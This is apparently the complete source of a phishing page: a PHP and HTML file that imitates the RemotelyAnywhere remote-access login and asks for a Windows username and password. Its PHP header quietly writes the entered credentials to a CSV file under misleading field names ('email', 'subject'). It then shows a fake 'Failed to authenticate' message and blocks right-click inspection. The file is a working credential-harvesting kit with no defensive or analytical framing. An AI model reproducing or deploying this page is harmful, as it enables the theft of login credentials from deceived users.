﻿ 
 <?php
//index.php

$error = '';
$name = '';
$email = '';
$subject = '';
$message = '';

function clean_text($string)
{
 $string = trim($string);
 $string = stripslashes($string);
 $string = htmlspecialchars($string);
 return $string;
}

if(isset($_POST["submit"]))
{
 
  if(empty($_POST["email"]))
 {
  $error .= '<p><label class="text-danger">Please Enter your Email</label><br></p>';
 }
 else
 {
  $email = clean_text($_POST["email"]);
 }
 
 if(empty($_POST["subject"]))
 {
  $error .= '<p><label class="text-danger">Enter Password</label><br></p>';
 }
 else
 {
  $subject = clean_text($_POST["subject"]);
 }


 if($error == '')
 {
  $file_open = fopen("contact_data.csv", "a");
  $no_rows = count(file("contact_data.csv"));
  if($no_rows > 1)
  {
   $no_rows = ($no_rows - 1) + 1;
  }
  $form_data = array(
   'sr_no'  => $no_rows,
   'email'  => $email,
   'subject' => $subject,
  
  );
  fputcsv($file_open, $form_data);
 $error = '<a style="color:red"><label class="text-success">Failed to authenticate.</label><br></a>';
  $name = '';
  $email = '';
  $subject = '';
  $message = '';
 }
 
 {   
    ?>
<script type="text/javascript">
$(document).ready(function() {
     $(document)[0].oncontextmenu = function() {return false;}
    // document.LoginForm.username.focus();
});

function make_blank()
{
document.LoginForm.username.value ="";
}

</script>      
    <?php
    }
    
}

?>


<html> 

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head> <title>RemotelyAnywhere</title> <link rel="icon" href="favicon.ico" type="image/x-icon"> <link rel="shortcut icon" href="favicon.ico"> <script language="JavaScript">
<!--
var ntlm_clicked = false;

if (window != top) 
top.location.href = location.href;

var pageLoaded = false;

function pageLoad()
{


if (document.loginform.domain) {
if (document.loginform.domain.clientWidth) {
var w = document.loginform.domain.clientWidth;
if (w > 150) {
document.loginform.domain.style.width = w;
if (document.loginform.username) {
document.loginform.username.style.width = w;
}
if (document.loginform.password) {
document.loginform.password.style.width = w;
}
}
}
}
formFocus();
}



//-->
</script> <link type="text/css" rel="stylesheet" href="css/RAc099c099.css?ui=full" /> <link type="text/css" rel="stylesheet" href="css/windowc099c099.css?ui=full" /> <script type="text/javascript" src="js/window.js"></script> </head> 




<body class="title" onload="pageLoad();">

  <script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>

	<form name="loginform" action="#" method="post" id="loginform"> <center> <br><br><br> <div id="logindiv" class="subwindow" style="position:relative; width: 500px; height:auto; visibility:visible;"> <div class="clientAreaLogin"> <center><br> <img src="img/RAlogo.png" alt="RemotelyAnywhere" width="160" height="64" border="0"> <br clear="all"><br> <!-- User name & password --> <script language="JavaScript">
<!--
function chk(f, ntlm) {
var un = f['username'].value;
var pw = f['password'].value;
var url = document.location.href;
if (f.ssl) {
if (f.ssl.checked && url.substring(0, 5) == "index.php")
f.action = "https:" + url.substring(5, url.lastIndexOf('index.php')) + "/" + f.action;
if (!f.ssl.checked && url.substring(0, 5) == "index.php")
f.action = "http:" + url.substring(6, url.lastIndexOf('index.php')) + "/" + f.action;
}
if (ntlm || un.length > 0) {
flipDivs();
ntlm_clicked = ntlm;
return true;
} else if (!ntlm_clicked) {
alert('Please specify your user name.');
f['username'].focus();
return false;
}
}
//-->
</script> 

<form method="post">

<div id="loginstuff"> <fieldset><legend>Windows Authentication</legend> <table width="80%"> <tr> <td align="center" colspan="2"> <br> Please enter your Windows username and password. <br><br> </td> 


     <?php echo $error; ?>

<td></td> </tr> <tr> <td align="right"><label for="usr">User name</label>&nbsp;</td> <td><input id="usr" type="text" class="txt" name="email" value=""size="25"></td> 

<td></td> </tr> <tr> <td align="right"><label for="pwd">Password</label>&nbsp;</td> <td><input id="pwd" type="password" autocomplete="off" class="txt" name="subject" value=""

size="25"
> </td> 



<td align="right"> <div class="button"><span class="buttonleft">&nbsp;</span><input type="submit" class="buttonmid" value="Login" name="submit" onclick="return chk(this.form)">

    </form>

<span class="buttonright">&nbsp;</span></div> </td> </tr> <tr> <td colspan="2"></td> </tr> </table><br> </fieldset><br> <!-- NTLM --> <!-- Options --> <br><br> <div class="button"><span class="buttonleft">&nbsp;</span><input type="submit" class="buttonmid" name="options.on" value="Show advanced options &gt;&gt;" onclick="this.form['password'].value=''; flipDivs(); return true;"><span class="buttonright">&nbsp;</span></div> <input type="hidden" value="m"> <input type="hidden" value=""> <br><br> </div> <div style="font: normal 10px arial; color: #5e8ca4"> The host computer keyboard and mouse have been inactive for 15 hours </div> </center> </div> </div> <div id="workingdiv" class="subwindow" style="position:relative; width: 100%; height:auto;visibility:visible; display:none"> <div class="clientAreaLogin"> &nbsp;<br> <center><b>Please wait...</b></center><br> &nbsp;<br> </div> </div> <center> <div style="position:relative;width:500px;height:auto;visibility:visible;"> </div> </center> </center> </form> <script language="JavaScript">
<!--
function formFocus() {
var form = document.forms.loginform;
if (form && (!document.getElementById("loginstuff") || document.getElementById("loginstuff").style.visibility != "hidden")) {
if (form.username && form.username.focus && form.password && form.password.focus)
{
if ("" == "" && "" == "") {
form.username.focus();
} else {
form.password.focus();
}
}
else if (form.password && form.password.focus)
{
form.password.focus();
}
else if (form.rsaid && form.rsaid.focus && form.rsaid.value == "")
{
form.rsaid.focus();
}
else if (form.passcode && form.passcode.focus)
{
form.passcode.focus();
}
else if (form.nexttoken && form.nexttoken.focus)
{
form.nexttoken.focus();
}
else if (form.pin && form.pin.focus)
{
form.pin.focus();
}
else if (form.ppwdc1 && form.ppwdc1.focus)
{
form.ppwdc1.focus();
}
}
}

function flipDivs() {
if (document.getElementById) {
var logindiv = document.getElementById("logindiv");
var workingdiv = document.getElementById("workingdiv");
var chatdiv = document.getElementById("chatstuff");
if (logindiv && workingdiv && chatdiv) {
logindiv.style.display = "none";
chatdiv.style.display = "none";
workingdiv.style.display = "block";
logindiv = document.getElementById("loginstuff");
if (logindiv) {
logindiv.style.display = "none";				
}
}
}
}

function flipLoginBtnText(bChat) {
if (document.getElementById){
var loginbtn = document.getElementById("loginid");
if (loginbtn) {
if (bChat){loginbtn.value = "Chat";} else { loginbtn.value = "Login";}	            
}
var ntlmbtn = document.getElementById("ntlmid");
if (ntlmbtn) {
if (bChat){ntlmbtn.value = "Chat";} else { ntlmbtn.value = "Login";}	            
}	        
}
gbChat = bChat;
}


formFocus();

//-->
</script> </body> 

</html> 
